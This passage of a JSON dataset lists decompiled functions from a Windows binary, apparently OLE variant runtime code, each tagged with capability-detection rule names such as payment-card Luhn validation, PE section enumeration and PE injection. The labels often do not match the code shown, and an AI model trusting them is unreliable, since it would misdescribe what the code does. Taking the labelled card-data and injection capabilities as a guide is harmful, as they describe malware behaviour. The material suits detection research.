        "decompiled_code": "\nuint __cdecl fcn.004113d8(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.004113d8(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 237
    },
    "00411434": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00411434(void)\n\n{\n    char cVar1;\n    uint16_t *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint plLbound;\n    uint ppvData;\n    uint var_310h;\n    int32_t plUbound;\n    uint16_t *psa;\n    uint pvarg;\n    uint var_300h;\n    uint var_2fch;\n    uint rgIndices;\n    \n    if ((*(in_EAX + 1) & 0x20) == 0) {\n        fcn.0041127c();\n    }\n    if ((*in_EAX & 0xfff) == 0xc) {\n        if ((*in_EAX & 0x4000) == 0) {\n            psa = *(in_EAX + 4);\n        }\n        else {\n            psa = **(in_EAX + 4);\n        }\n        uVar2 = *psa;\n        if (-1 < uVar2 - 1) {\n            iVar7 = 0;\n            piVar6 = &var_300h;\n            uVar5 = uVar2;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar7 + 1, piVar6 + 1);\n                fcn.0041127c();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.0041127c();\n                *piVar6 = (plUbound - piVar6[1]) + 1;\n                iVar7 = iVar7 + 1;\n                piVar6 = piVar6 + 2;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (-1 < uVar2 - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.004113a8(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex();\n                fcn.0041127c();\n                fcn.0041162c();\n            }\n            cVar1 = fcn.004113d8(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    sub.oleaut32.dll_VariantClear(in_EAX);\n    fcn.0041127c();\n    return;\n}\n",
        "token_count": 635
    },
    "0041174c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041174c(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "0041177c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041177c(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.0041177c(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 237
    },
    "004117d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004117d8(code *param_1, uint16_t *param_2)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint plLbound;\n    uint var_31ch;\n    uint ppvData;\n    uint16_t *psa;\n    uint32_t cDims;\n    int32_t plUbound;\n    code *var_308h;\n    ushort *pvargDest;\n    uint rgsabound;\n    uint var_2fch;\n    uint rgIndices;\n    \n    var_308h = param_1;\n    pvargDest = in_EAX;\n    if ((*(param_2 + 1) & 0x20) == 0) {\n        fcn.0041127c();\n    }\n    if ((*param_2 & 0xfff) == 0xc) {\n        if ((*param_2 & 0x4000) == 0) {\n            psa = *(param_2 + 4);\n        }\n        else {\n            psa = **(param_2 + 4);\n        }\n        uVar2 = *psa;\n        cDims = uVar2;\n        if (-1 < uVar2 - 1) {\n            iVar6 = 0;\n            piVar5 = &rgsabound;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar6 + 1, piVar5 + 1);\n                fcn.0041127c();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.0041127c();\n                *piVar5 = (plUbound - piVar5[1]) + 1;\n                iVar6 = iVar6 + 1;\n                piVar5 = piVar5 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        iVar6 = sub.oleaut32.dll_SafeArrayCreate(0xc, cDims, &rgsabound);\n        if (iVar6 == 0) {\n            fcn.00410fd4();\n        }\n        fcn.0041162c();\n        *pvargDest = 0x200c;\n        *(pvargDest + 4) = iVar6;\n        if (-1 < cDims - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            uVar2 = cDims;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.0041174c(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(psa, &rgIndices, &ppvData);\n                fcn.0041127c();\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(iVar6, &rgIndices, &var_31ch);\n                fcn.0041127c();\n                (*var_308h)();\n            }\n            cVar1 = fcn.0041177c(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    else {\n        sub.oleaut32.dll_VariantCopy(pvargDest, param_2);\n        fcn.0041127c();\n    }\n    return;\n}\n",
        "token_count": 818
    },
    "00411a9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411a9c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    \n    puStack36 = &fcn.00411a9c::pvarg;\n    puStack40 = 0x411ab4;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x411af8;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a58();\n    (**0x497984)();\n    fcn.00411d24();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x411aff;\n    uStack44 = 0x411af7;\n    fcn.0041162c();\n    return;\n}\n",
        "token_count": 209
    },
    "00412004": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00412004(void)\n\n{\n    uchar *puStack24;\n    uchar auStack20 [16];\n    \n    puStack24 = auStack20;\n    sub.oleaut32.dll_VariantInit();\n    (***0x492698)(&puStack24);\n    fcn.00411288();\n    return 0x400;\n}\n",
        "token_count": 76
    },
    "00412040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412040(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_4h;\n    \n    puStack32 = &fcn.00412040::pvarg;\n    puStack36 = 0x412052;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x412094;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a58();\n    (**0x497984)();\n    var_4h = fcn.004120e8();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41209b;\n    uStack40 = 0x412093;\n    fcn.0041162c();\n    return;\n}\n",
        "token_count": 215
    },
    "004120a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.004120a4(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    \n    uVar1 = fcn.00416168();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(3);\n        *param_2 = iStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 123
    },
    "00412b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412b00(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &fcn.00412b00::pvarg;\n    puStack40 = 0x412b12;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x412b57;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a58();\n    (**0x497984)();\n    _var_8h = fcn.00412bb8();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x412b5e;\n    uStack44 = 0x412b56;\n    fcn.0041162c();\n    return;\n}\n",
        "token_count": 239
    },
    "00412b6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00412b6c(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416168();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(0x14);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 146
    },
    "00413100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00413100(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_1h;\n    \n    puStack32 = &fcn.00413100::pvarg;\n    puStack36 = 0x413112;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x413154;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &fcn.00413100::var_1h + 1;\n    fcn.00411a58();\n    (**0x497984)();\n    var_1h._0_1_ = fcn.004131b0();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41315b;\n    uStack40 = 0x413153;\n    fcn.0041162c();\n    return;\n}\n",
        "token_count": 255
    },
    "00413504": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00413504(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack52 = 0x4135b9;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00415154();\n    uVar3 = var_4h;\n    iVar2 = (***0x492570)(var_4h, 0x400, 0, &var_10h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004057d4();\n        cVar1 = fcn.0040b76c();\n        if (cVar1 == '\\0') {\n            fcn.00411288();\n        }\n        else {\n            _var_10h = _var_20h;\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.00411288();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x4135c0);\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 335
    },
    "004135c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.004135c8(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x492698)(auStack24);\n    fcn.00411288();\n    return CONCAT44(auStack20, 5);\n}\n",
        "token_count": 74
    },
    "00413614": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413614(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    double dStack12;\n    \n    puStack36 = &fcn.00413614::pvarg;\n    puStack40 = 0x413626;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x413669;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a58();\n    (**0x497984)();\n    fVar1 = fcn.004136c4();\n    dStack12 = fVar1;\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x413670;\n    uStack44 = 0x413668;\n    fcn.0041162c();\n    return;\n}\n",
        "token_count": 228
    },
    "00413678": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00413678(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416168();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(5);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "00413bcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413bcc(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack48 = 0x413ca8;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00415154();\n    uVar3 = var_4h;\n    iVar2 = (***0x492390)(var_4h, 0x400, 0, &var_10h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004057d4();\n        cVar1 = fcn.0040d198();\n        if (cVar1 == '\\0') {\n            fcn.004057d4();\n            cVar1 = fcn.0040b788();\n            if (cVar1 == '\\0') {\n                fcn.00411288();\n            }\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.00411288();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405554(0x413caf);\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 357
    },
    "00413cb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00413cb8(uint arg_8h, uint arg_ch)\n\n{\n    uint pvarg;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    sub.oleaut32.dll_VariantInit(&pvarg);\n    pvarg._0_2_ = 5;\n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    (***0x492698)(&pvarg, &pvarg, 0x400, 0, 7);\n    fcn.00411288();\n    return CONCAT44(var_ch, var_10h);\n}\n",
        "token_count": 157
    },
    "00413d18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.00413d18(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x492698)(auStack24);\n    fcn.00411288();\n    return CONCAT44(auStack20, 7);\n}\n",
        "token_count": 74
    },
    "00413d64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413d64(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    double dStack12;\n    \n    puStack36 = &fcn.00413d64::pvarg;\n    puStack40 = 0x413d76;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x413db9;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a58();\n    (**0x497984)();\n    fVar1 = fcn.00413e14();\n    dStack12 = fVar1;\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x413dc0;\n    uStack44 = 0x413db8;\n    fcn.0041162c();\n    return;\n}\n",
        "token_count": 234
    },
    "00413dc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00413dc8(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416168();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(7);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 143
    },
    "00414164": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414164(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x414210;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.00415154();\n    uVar3 = var_4h;\n    iVar2 = (***0x492738)(var_4h, 0x400, 0, &var_10h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004057d4();\n        cVar1 = fcn.0040b7e0();\n        if (cVar1 == '\\0') {\n            fcn.00411288();\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.00411288();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x414217);\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 297
    },
    "00414220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00414220(uint arg_8h, uint arg_ch)\n\n{\n    uint pvarg;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    sub.oleaut32.dll_VariantInit(&pvarg);\n    pvarg._0_2_ = 5;\n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    (***0x492698)(&pvarg, &pvarg, 0x400, 0, 6);\n    fcn.00411288();\n    return CONCAT44(var_ch, var_10h);\n}\n",
        "token_count": 156
    },
    "00414280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.00414280(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x492698)(auStack24);\n    fcn.00411288();\n    return CONCAT44(auStack20, 6);\n}\n",
        "token_count": 73
    },
    "004142cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004142cc(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    int64_t iStack12;\n    \n    puStack36 = &fcn.004142cc::pvarg;\n    puStack40 = 0x4142de;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x414321;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a58();\n    (**0x497984)();\n    fVar1 = fcn.0041437c();\n    iStack12 = ROUND(fVar1);\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x414328;\n    uStack44 = 0x414320;\n    fcn.0041162c();\n    return;\n}\n",
        "token_count": 232
    },
    "00414330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00414330(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416168();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(6);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "0041487c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041487c(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_14h = 0;\n    uStack44 = 0x41493b;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = &fcn.0041487c::pvarg;\n    puStack56 = 0x4148a7;\n    sub.oleaut32.dll_VariantInit();\n    uStack60 = 0x414919;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    (***0x492698)(&fcn.0041487c::pvarg);\n    fcn.00411288();\n    arg_8h = &fcn.0041487c::var_14h;\n    fcn.00405e6c();\n    fcn.00405f58(arg_8h);\n    fcn.004057d4();\n    *in_FS_OFFSET = arg_8h;\n    fcn.0041162c(0x414920);\n    return;\n}\n",
        "token_count": 352
    },
    "00414948": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414948(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.00414948::pvarg;\n    puStack36 = 0x41495d;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x41499e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a58();\n    (**0x497984)();\n    fcn.00414a34();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x4149a5;\n    uStack40 = 0x41499d;\n    fcn.0041162c();\n    return;\n}\n",
        "token_count": 207
    },
    "00414f70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414f70(uint param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x41501a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = &fcn.00414f70::pvarg;\n    puStack52 = 0x414f98;\n    sub.oleaut32.dll_VariantInit();\n    uStack56 = 0x414ffd;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uVar3 = 8;\n    uVar2 = 0;\n    uVar1 = 0x400;\n    puStack52 = &stack0xfffffffc;\n    (***0x492698)(&fcn.00414f70::pvarg);\n    fcn.00411288();\n    fcn.00405e6c();\n    fcn.00405f58(param_2);\n    *in_FS_OFFSET = param_2;\n    fcn.0041162c(0x415004, uVar1, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 357
    },
    "00415028": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415028(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.00415028::pvarg;\n    puStack36 = 0x41503d;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x41507e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a58();\n    (**0x497984)();\n    fcn.00415154();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x415085;\n    uStack40 = 0x41507d;\n    fcn.0041162c();\n    return;\n}\n",
        "token_count": 204
    },
    "004156a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004156a8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack32 = &fcn.004156a8::pvarg;\n    puStack36 = 0x4156bd;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x415712;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a58();\n    (**0x497984)();\n    if (pvarg != 0xd) {\n        fcn.00410e48();\n    }\n    fcn.00407024();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x415719;\n    uStack40 = 0x415711;\n    fcn.0041162c();\n    return;\n}\n",
        "token_count": 243
    },
    "00415d0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
